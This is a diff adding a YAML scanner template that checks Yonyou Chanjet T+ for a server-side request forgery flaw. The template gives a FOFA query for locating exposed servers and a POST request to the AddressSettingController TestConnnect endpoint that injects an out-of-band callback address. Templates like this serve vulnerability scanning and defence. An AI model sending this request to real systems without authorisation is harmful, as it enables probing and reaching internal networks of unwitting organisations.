@@ -1,0 +1,34 @@
+id: yongyou-changjietong-addresssettingcontroller-ssrf
+
+info:
+  name: 用友畅捷通AddressSettingController-SSRF漏洞
+  author: AVIC123
+  severity: high
+  verified: true
+  description: |
+    在用友畅捷通T+系统中，AddressSettingController 的 TestConnnect 方法存在服务端请求伪造（SSRF）漏洞。攻击者可以利用该漏洞发送恶意请求，访问内部网络资源或敏感信息。
+    fofa: app="畅捷通-TPlus"
+  reference:
+    - https://cn-sec.com/archives/1865353.html
+  tags: yongyou,ssrf
+  created: 2025/08/29
+
+set:
+  oob: oob()
+  oobHTTP: oob.HTTP
+  hostname: request.url.host
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /tplus/ajaxpro/Ufida.T.SM.UIP.UA.AddressSettingController,Ufida.T.SM.UIP.ashx?method=TestConnnect
+      headers:
+        Content-Type: application/json
+      body: |
+        {
+        "address": "{{oobHTTP}}"
+        }
+    expression: response.status == 200 && oobCheck(oob, oob.ProtocolHTTP, 3)
+
+expression: r0()
